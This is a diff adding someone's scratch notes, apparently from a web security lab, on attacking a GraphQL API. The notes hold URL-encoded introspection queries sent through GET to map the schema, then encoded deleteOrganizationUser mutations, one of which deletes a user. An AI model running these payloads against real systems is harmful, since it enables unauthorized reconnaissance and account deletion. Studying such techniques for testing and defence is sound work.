@@ -1,0 +1,50 @@
+currently have this:
+query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description args{...InputValue}}}}
+
+need to encode the brackets of this
+
+
+so far the only query that works is:
+GET /api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
+
+and returns:
+{
+  "data": {
+    "__schema": {
+      "queryType": {
+        "name": "query"
+      }
+    }
+  }
+}
+
+
+using the following payload in the URL, query%7B__schema%0A%7Btypes%7Bname,fields%7Bname%7D%7D%7D%7D gave me more info on the database
+
+mutation {deleteOrganizationUser(input:{id:1}){name:"administrator"}}
+
+mutation%7BdeleteOrganizationUser(input%3A%7Bid%3A1%7D)%7Bname%3A%22administrator%22%7D%7D
+
+
+mutation{deleteOrganizationUser(input:{id:1}){user{name:"username"}}}
+
+mutation%7BdeleteOrganizationUser(input%3A%7Bid%3A1%7D)%7Buser%7Bname%3A%22username%22%7D%7D%7D
+
+
+ended up using this:
+mutation%7BdeleteOrganizationUser(input%3A%7Bid%3A2%7D)%7Buser%7Bid%7D%7D%7D
+
+which translates to:
+mutation{
+    deleteOrganizationUser
+    (input:
+        {
+            id:2
+        }
+    )
+    {user
+        {
+            id
+        }
+    }
+}
